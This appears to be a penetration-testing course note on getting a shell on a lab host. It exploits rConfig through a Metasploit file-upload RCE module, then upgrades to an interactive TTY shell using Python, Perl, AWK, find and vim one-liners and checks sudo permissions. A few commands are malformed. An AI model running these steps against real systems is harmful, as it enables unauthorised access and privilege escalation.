# NIX Shells - TTY Shell

### 1.Gaining a Shell Through Attacking a Vulnerable Application

**Enumerate the Host**

```shell-session
nmap -sC -sV 10.129.201.101
```

**rConfig Management Tool**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FyG7ZiAieD6P4n81t31RA%2Fimage.png?alt=media&amp;token=dae7bfae-fd8d-47dc-b533-96efefe73be4" alt=""><figcaption></figcaption></figure>

### Discovering a Vulnerability in rConfig

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FbXnZrbrzrdA7iy3a6Alr%2Fimage.png?alt=media&amp;token=cc1bcd15-cea2-47ac-b0c2-3495622ee6ec" alt=""><figcaption></figcaption></figure>

**Search For an Exploit Module**

```shell-session
msf6 > search rconfig
```

<https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits>

\
**Locate**

* `/usr/share/metasploit-framework/modules/exploits`
* apt update; apt install metasploit-framework

```shell-session
locate exploits
```

### Using the rConfig Exploit and Gaining a Shell

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

**Execute the Exploit**

```shell-session
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
```

**Interact With the Shell**

```shell-session
meterpreter > shell
```

***

## 2.Spawning a TTY Shell with Python

Know that whenever we see `/bin/sh` or `/bin/bash`, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across `bourne shell` (`/bin/sh`) and `bourne again shell` (`/bin/bash`) present on the system natively.

**Interactive Python**

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 
```

```shell-session
/bin/sh -i
```

### Perl

**Perl To Shell**

```shell-session
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```

### Ruby

**Ruby To Shell**

```shell-session
ruby: exec "/bin/sh"
```

### Lua

**Lua To Shell**

```shell-session
lua: os.execute('/bin/sh')
```

### AWK

**AWK To Shell**

```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

### Find

**Using Find For A Shell**

```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

### Using Exec To Launch A Shell

```shell-session
find . -exec /bin/sh \; -quit
```

### VIM

**Vim To Shell**

```shell-session
vim -c ':!/bin/sh'
```

**Vim Escape**

```shell-session
vim
:set shell=/bin/sh
:shell
```

## Execution Permissions Considerations

**Permissions**

```shell-session
ls -la <path/to/fileorbinary>
```

**Sudo -l**

```shell-session
sudo -l
```

The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. Not only will considering permissions allow us to see what commands we can execute, but it may also start to give us an idea of potential vectors that will allow us to escalate privileges.
